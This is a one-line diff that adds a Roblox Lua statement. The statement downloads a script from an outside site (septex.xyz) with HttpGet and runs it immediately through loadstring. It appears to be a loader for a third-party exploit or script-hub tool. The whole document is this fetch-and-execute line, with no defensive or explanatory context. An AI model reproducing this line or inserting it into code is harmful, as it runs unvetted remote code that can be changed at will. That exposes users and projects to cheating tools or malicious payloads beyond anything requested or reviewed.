@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://septex.xyz/ProjectSeptex.txt'),true))()
